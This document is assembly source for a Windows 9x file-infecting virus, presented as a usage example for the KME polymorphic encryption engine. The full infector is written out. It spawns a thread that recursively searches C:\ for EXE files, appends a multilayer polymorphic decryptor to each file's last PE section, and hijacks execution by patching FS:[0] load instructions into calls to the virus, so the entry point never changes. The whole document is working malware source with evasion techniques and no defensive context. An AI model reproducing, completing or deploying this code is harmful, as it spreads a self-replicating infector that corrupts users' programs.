   ; ---------------------------------------------------------------------------
   ;
   ;             win9X.KME55X.Examplo virus -- KME usage example
   ;
   ; ---------------------------------------------------------------------------
   ;
   ; 1. Per-process resident (create new thread) PE EXE infector.
   ; 2. In new thread: recursively scans C:\ for *.EXE
   ; 3. Multilayer KME decryptor will be built, and appended to last section.
   ; 4. All infected files will grow by MAXVIRSIZE const - and it may be
   ;    changed to whatever you want.
   ; 5. Do not modify entrypoint. Find all MOV EAX, FS:[00000000h] within
   ;    1st section, and replace with CALL VIRUS.
   ;
   ; ---------------------------------------------------------------------------

   MAXVIRSIZE              equ     1048576  ; <-- the more size, the more layers

   include                 consts.inc
   include                 kme.inc

                           p386
                           model   flat
                           locals  __

                           .data

   ; ---------------------------------------------------------------------------

   virstart:
   virentry:
                           pusha

                           call    __seh_init
                           mov     esp, [esp+8]
                           jmp     __seh_error
   __seh_init:             push    dword ptr fs:[0]
                           mov     fs:[0], esp

                           call    $+5
                           pop     ebp
                           sub     ebp, $-1-virstart

                           call    get_func_names
                           jc      __exit

                           push    'A92'
                           push    esp
                           call    x_FindAtomA-virstart[ebp]
                           pop     ecx
                           or      ax, ax
                           jnz     __exit  ; exit if alredy set
                           push    'A92'
                           push    esp
                           call    x_AddAtomA-virstart[ebp]
                           pop     ecx

                           push    virmemory
                           push    40h     ; GMEM_FIXED+GMEM_ZEROINIT
                           call    x_GlobalAlloc-virstart[ebp]
                           or      eax, eax
                           jz      __exit
                           xchg    ebp, eax

                           call    $+5
                           pop     esi
                           sub     esi, $-1-virstart
                           mov     edi, ebp
                           mov     ecx, virmemory  ; i.e. with initialized APIs
                           cld
                           rep     movsb

                           push    eax
                           push    esp
                           push    0
                           push    ebp  ; thread arg = vir base
                           lea     eax, [ebp+newthread-virstart]
                           push    eax ; start address
                           push    0 ; stack size. 0==same as in primary thread
                           push    0
                           call    x_CreateThread-virstart[ebp]
                           pop     eax
   __exit:
   __seh_error:            pop     dword ptr fs:[0]
                           pop     eax

                           popa
                           retn

   newthread:
                           pusha
                           mov     ebp, [esp+32+4] ; thread arg = vir base

                           call    __seh_init      ; SEH,
                           mov     esp, [esp+8]    ; Self-Exception Handling,
                           jmp     __seh_error
   __seh_init:             push    dword ptr fs:[0]
                           mov     fs:[0], esp

                           push    MAXVIRSIZE
                           push    40h
                           call    x_GlobalAlloc-virstart[ebp]
                           mov     tempbufptr-virstart[ebp], eax

                           ; EDI=ff_struc
                           ; EDX=dir
                           sub     esp, size ff_struc
                           mov     edi, esp
                           push    '\:C'
                           mov     edx, esp        ; EDX='C:\',0
                           call    process_directory
                           add     esp, 4+size ff_struc

                           push    dword ptr [tempbufptr-virstart+ebp]
                           call    x_GlobalFree-virstart[ebp]

   __seh_error:            pop     dword ptr fs:[0]
                           pop     eax

                           popa
                           retn

   get_func_names:
                           lea     esi, imp_name-virstart[ebp]
                           lea     edi, imp_addr-virstart[ebp]

   __cycle:                call    get_proc_address
                           jz      __error
                           stosd

   __scan0:                lodsb
                           or      al, al
                           jnz     __scan0

                           cmp     [esi], al
                           jne     __cycle

   __success:              clc
                           retn

   __error:                stc
                           retn

   ; input:  ESI=function name wihtin kernel32 (4ex 'CreateProcessA')
   ; action: analyze kernel export table
   ; output: ZF=1, EAX=0 (function not found)
   ;         ZF=0, EAX=function va

   get_proc_address:       pusha

                           mov     ebx, 0BFF70000h         ; get_kernel_base

                           mov     ecx, [ebx].mz_neptr
                           mov     ecx, [ecx+ebx].pe_exporttablerva
                           add     ecx, ebx

                           xor     edi, edi        ; current index
   __search_cycle:         lea     edx, [edi*4+ebx]
                           add     edx, [ecx].ex_namepointersrva
                           mov     edx, [edx]      ; name va
                           add     edx, ebx        ; +imagebase

                           pusha                   ; compare names
                           mov     edi, edx
   __cmp_cycle:            cmp     byte ptr [edi], 0
                           je      __cmp_done
                           cmpsb
                           je      __cmp_cycle
   __cmp_done:             popa

                           je      __name_found

                           inc     edi             ; index++
                           cmp     edi, [ecx].ex_numofnamepointers
                           jb      __search_cycle

   __return_0:             xor     eax, eax        ; return 0
                           jmp     __return

   __name_found:           mov     edx, [ecx].ex_ordinaltablerva
                           add     edx, ebx        ; +imagebase
                           movzx   edx, word ptr [edx+edi*2]; edx=current ordinal
                           mov     eax, [ecx].ex_addresstablerva
                           add     eax, ebx        ; +imagebase
                           mov     eax, [eax+edx*4]; eax=current address
                           add     eax, ebx        ; +imagebase

   __return:               mov     [esp].popa_eax, eax  ; popa.eax
                           test    eax, eax

                           popa
                           retn

   ; subroutine: process_directory
   ; action:     1. find all files in the current directory
   ;             2. for each found directory (except "."/"..") recursive call;
   ;                for each found file call process_file
   ; input:      EDI=ff_struc
   ;             EDX=directory name
   ; output:     none

   process_directory:      pusha
                           sub     esp, 1024

                           mov     esi, edx
                           mov     edi, esp

   __1:                    lodsb
                           stosb
                           or      al, al
                           jnz     __1

                           dec     edi
                           mov     al, '\'
                           cmp     [edi-1], al
                           je      __3
                           stosb
   __3:
                           mov     ebx, edi

                           mov     eax, '*.*'
                           stosd

                           mov     edi, [esp+1024]

                           mov     eax, esp
                           push    edi
                           push    eax
                           call    x_FindFirstFileA-virstart[ebp]

                           xchg    esi, eax

                           cmp     esi, -1
                           je      __quit

   __cycle:                pusha
                           lea     esi, [edi].ff_fullname
                           mov     edi, ebx
   __strcpy:               lodsb
                           stosb
                           or      al, al
                           jnz     __strcpy
                           popa

                           mov     edx, esp

                           test    byte ptr [edi].ff_attr, 16
                           jnz     __dir

                           call    process_file

                           jmp     __next
   __dir:
                           lea     eax, [edi].ff_fullname
                           cmp     byte ptr [eax], '.'    ; skip ./../etc.
                           je      __next

                           call    process_directory

   __next:                 push    edi
                           push    esi
                           call    x_FindNextFileA-virstart[ebp]

                           or      eax, eax
                           jnz     __cycle

                           push    esi
                           call    x_FindClose-virstart[ebp]

   __quit:                 add     esp, 1024
                           popa
                           retn

   ; input: EDX=full filename
   ;        EDI=ff_struc

   process_file:           pusha

                           mov     esi, edx
   __scan0:                lodsb
                           or      al, al
                           jne     __scan0
                           mov     eax, [esi-5]
                           or      eax, 20202000h

                           cmp     eax, 'exe.'   ; .exe
                           je      __infect

                           popa
                           retn

   __infect:               call    infect_file

                           popa
                           retn

   ; input: EDX=fullname
   ;        EDI=ff_struc
   ;        EAX=extension

   infect_file:            pusha

                           mov     esi, [edi].ff_size

                           cmp     esi, 256*1024
                           jae     __exit

                           push    0
                           push    80h     ; FILE_ATTRIBUTE_NORMAL
                           push    3       ; 3=OPEN_EXISTING  2=CREATE_ALWAYS
                           push    0
                           push    1+2     ; 1=FILE_SHARE_READ 2=FILE_SHARE_WRITE
                           push    080000000h+40000000h ; GENERIC_READ + GENERIC_WRITE
                           push    edx     ; EDX=fname
                           call    x_CreateFileA-virstart[ebp]
                           cmp     eax, -1
                           je      __exit
                           xchg    ebx, eax

                           lea     eax, [esi+MAXVIRSIZE]
                           push    eax                     ; size
                           push    0                       ; 0=GMEM_FIXED
                           call    x_GlobalAlloc-virstart[ebp]
                           xchg    edi, eax

                           push    0
                           push    esp                     ; bytesread
                           push    esi                     ; size
                           push    edi                     ; buf
                           push    ebx                     ; handle
                           call    x_ReadFile-virstart[ebp]

                           call    infect_real
                           jc      __close

                           push    0                       ; FILE_BEGIN
                           push    0
                           push    0
                           push    ebx
                           call    x_SetFilePointer-virstart[ebp]

                           push    0
                           push    esp                     ; bytesread
                           push    esi                     ; size
                           push    edi                     ; buf
                           push    ebx                     ; handle
                           call    x_WriteFile-virstart[ebp]

   __close:
                           push    edi
                           call    x_GlobalFree-virstart[ebp]

                           push    ebx
                           call    x_CloseHandle-virstart[ebp]

   __exit:                 popa
                           retn

   ; subroutine.
   ; infects file read into memory.

   ; input:  EDI=buffer with file (max size is ESI+MAXVIRSIZE)
   ;         ESI=file length
   ; output: CF==0 -- infected OK, ESI=new size
   ;         CF==1 -- error

   infect_real:            pusha

                           cmp     [edi].mz_id, 'ZM'   ; check if MZ file
                           jne     __error

                           mov     ebx, edi
                           add     ebx, [ebx].mz_neptr ; EBX = PE header

                           cmp     [ebx].pe_id, 'EP'   ; check if PE file
                           jne     __error

                           test    [ebx].pe_exeflags, 2000h ; dll ?
                           jnz     __error

                           cmp     [ebx].pe_userminor, 100
                           je      __error
                           mov     [ebx].pe_userminor, 100

                           movzx   eax, [ebx].pe_ntheadersize
                           add     eax, 18h

                           add     eax, ebx

                           movzx   ecx, [ebx].pe_numofobjects
                           dec     ecx
                           imul    ecx, size oe_struc

                           add     ecx, eax

                           mov     eax, [ebx].pe_filealign
                           dec     eax
                           add     [ecx].oe_phys_size, eax
                           not     eax
                           and     [ecx].oe_phys_size, eax

                           mov     eax, [ebx].pe_objectalign
                           dec     eax
                           add     [ecx].oe_virt_size, eax
                           not     eax
                           and     [ecx].oe_virt_size, eax

                           mov     eax, [ecx].oe_phys_offs
                           add     eax, [ecx].oe_phys_size
                           cmp     eax, esi
                           jne     __error

                           mov     eax, [ecx].oe_phys_size
                           mov     edx, [ecx].oe_virt_size
                           cmp     eax, edx
                           ja      __error
                           or      eax, edx
                           jz      __error

                           lea     eax, [esi+edi]  ; EAX=kme_outbuf_ptr
                           call    do_morph
                           jc      __error

                           call    do_uep
   ;                       jc      __error

                           mov     edx, MAXVIRSIZE
                           mov     eax, [ebx].pe_objectalign
                           dec     eax
                           add     edx, eax
                           not     eax
                           and     edx, eax

                           add     [ebx].pe_imagesize, edx
                           add     [ebx].pe_sizeofcode, edx

                           add     [ebx].pe_stackreservesize, MAXVIRSIZE*16
                           add     [ebx].pe_heapreservesize,  MAXVIRSIZE*16

                           add     [ecx].oe_virt_size, edx

                           mov     edx, MAXVIRSIZE
                           mov     eax, [ebx].pe_filealign
                           dec     eax
                           add     edx, eax
                           not     eax
                           and     edx, eax

                           add     [ecx].oe_phys_size, edx

                           add     [esp].popa_esi, edx

   __success:              clc
                           popa
                           retn

   __error:                stc
                           popa
                           retn

   ; EBP=inbuf   size=virsize
   ; EAX=outbuf  size=MAXVIRSIZE

   do_morph:               pusha

                           push    FLAG_NOJMPS+FLAG_X_CALLESP ; flags
                           push    CMD_ALL                 ; cmd mask
                           push    CMD2_ALL-CMD2_FPU       ; cmd2 mask
                           push    REG_ALL                 ; reg mask
                           push    0                       ; jmps if rnd(X)==0
                           push    0                       ; [output eip]
                           push    0                       ; [output size]
                           push    0                       ; output filler
                           push    MAXVIRSIZE              ; output/max size
                           push    eax                     ; output buffer
                           push    virentry-virstart       ; input eip
                           push    virmemory               ; input size
                           push    ebp                     ; input buffer
                           push    0                       ; 0 or pointer to 8 dwords
                           push    0                       ; 0 or pointer to 8 dwords
                           push    0                       ; virus in-file RVA
                           push    0                       ; original entry RVA
                           push    REG_ALL                 ; push/pop regs at prolog/epilog
                           call    x_GetTickCount-virstart[ebp]
                           push    eax                     ; randseed
                           push    29Ah                    ; # of layers ;-)
                           push    dword ptr [tempbufptr-virstart+ebp] ; tempbuf
                           call    kme
                           add     esp, 4*KME_N_ARGS

                           cmp     eax, KME_ERROR_SUCCESS
                           jne     __error

                           clc
                           popa
                           retn

                           ; should never happen
   __error:                stc
                           popa
                           retn

   ; input: EDI=file buffer ptr
   ;        ESI=size (original, w/o virus)
   ;        ECX=last section objentry
   ;        EBX=pe header

   do_uep:                 pusha

                           mov     edi, [ecx].oe_virt_rva   ; EDI=vir RVA
                           add     edi, [ecx].oe_phys_size

                           movzx   esi, [ebx].pe_ntheadersize
                           lea     esi, [ebx+esi+18h]       ; EAX=&objtable[0]
                           mov     ebx, [esi].oe_phys_offs  ; EBX=1st sect offs
                           add     ebx, [esp].pusha_edi
                           mov     eax, [esi].oe_virt_rva   ; EAX=curr.RVA
                           mov     ecx, [esi].oe_phys_size  ; ECX=1st sect size

   @@cycle:
                           ; MOV EAX, FS:[00000000h] <-- useless stuff ;-)
                           cmp     word ptr [ebx], 0A164h     ; 64 A1
                           jne     @@not
                           cmp     dword ptr [ebx+2], 0       ; 0 0 0 0
                           jne     @@not

                           pusha

                           mov     byte ptr [ebx], 0E8h

                           add     eax, 5
                           sub     edi, eax
                           mov     [ebx+1], edi

                           mov     byte ptr [ebx+5], 90h

                           popa

   @@not:                  inc     eax
                           inc     ebx
                           loop    @@cycle

                           ; even if we replaced nothing

                           popa
                           retn
   imp_name:
                           db      'FindFirstFileA',0
                           db      'FindNextFileA',0
                           db      'FindClose',0
                           ;;
                           db      'CreateFileA',0
                           db      'SetFilePointer',0
                           db      'ReadFile',0
                           db      'WriteFile',0
                           db      'CloseHandle',0
                           ;;
                           db      'GlobalAlloc',0
                           db      'GlobalFree',0
                           ;;
                           db      'CreateThread',0
                           ;;
                           db      'FindAtomA',0
                           db      'AddAtomA',0
                           ;;
                           db      'GetTickCount',0
                           ;;
                           db      0

   include                 kmebin.inc

                           align   4

   virsize                 equ     $-virstart

   imp_addr:
   x_FindFirstFileA        dd      ?
   x_FindNextFileA         dd      ?
   x_FindClose             dd      ?
                           ;;
   x_CreateFileA           dd      ?
   x_SetFilePointer        dd      ?
   x_ReadFile              dd      ?
   x_WriteFile             dd      ?
   x_CloseHandle           dd      ?
                           ;;
   x_GlobalAlloc           dd      ?
   x_GlobalFree            dd      ?
                           ;;
   x_CreateThread          dd      ?
                           ;;
   x_FindAtomA             dd      ?
   x_AddAtomA              dd      ?
                           ;;
   x_GetTickCount          dd      ?
                           ;;

   tempbufptr              dd      ?

                           align   4

   virmemory               equ     $-virstart

   ; ---------------------------------------------------------------------------

                           .code
   loader:

                           call    virentry

                           push    60*1000
                           extern  Sleep:PROC
                           call    Sleep

                           push    -1
                           extern  ExitProcess:PROC
                           call    ExitProcess

                           end     loader
